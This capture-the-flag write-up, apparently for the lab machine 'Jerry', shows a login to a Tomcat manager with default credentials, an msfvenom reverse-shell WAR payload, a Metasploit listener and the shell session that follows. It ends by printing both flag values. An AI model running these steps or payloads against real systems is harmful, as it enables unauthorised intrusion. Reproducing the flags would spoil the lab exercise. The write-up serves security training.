144 - Jerry
===========

 quick nmap scan on this machine returns the port 8080 open. This is thedefault Tomcat management port. When logging in we can indeed see that Tomcat 7.0.88 is running. Using the <http://10.10.10.95:8080/manager/status> page, we see it is running under Windows Server 2012 R2 64 bit.

Trying some credentials for the manager page quickly leads to a default password being in use, `tomcat:s3cret`. From there we can use msfvenom to generate a war file that will connect back to give us a reverse shell:
```
❯❯❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.121 LPORT=12443 -f war > rev.war
Payload size: 1100 bytes
Final size of war file: 1100 bytes
```

One can then start a metasploit listener on the local host:
```
❯❯❯ msfconsole
[CUT CUT CUT]
msf > use exploit/multi/handler
msf exploit(multi/handler) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
msf exploit(multi/handler) > set LHOST 10.10.14.121
LHOST => 10.10.14.121
msf exploit(multi/handler) > set LPORT 12443
LPORT => 12443
msf exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.14.121:12443 
```

We now need to deploiy the rev.war file on the tomcat server manager page. Then we have to visit the page <http://10.10.10.95:8080/rev/> to launch the reverse shell. This triggers the following on localhost:
```
[*] Sending stage (336 bytes) to 10.10.10.95
[*] Command shell session 7 opened (10.10.14.121:12443 -> 10.10.10.95:49248) at 2018-07-07 21:35:32 +0200

Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>More?
```

After some tests, we can simply move to the administrator's desktop and display the flags:
```
C:\apache-tomcat-7.0.88>cd C:\Users\Administrator\Desktop\flags
C:\Users\Administrator\Desktop\flags>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FC2B-E489

 Directory of C:\Users\Administrator\Desktop\flags

06/19/2018  07:09 AM    <DIR>          .
06/19/2018  07:09 AM    <DIR>          ..
06/19/2018  07:11 AM                88 2 for the price of 1.txt
               1 File(s)             88 bytes
               2 Dir(s)  27,604,021,248 bytes free

C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
```
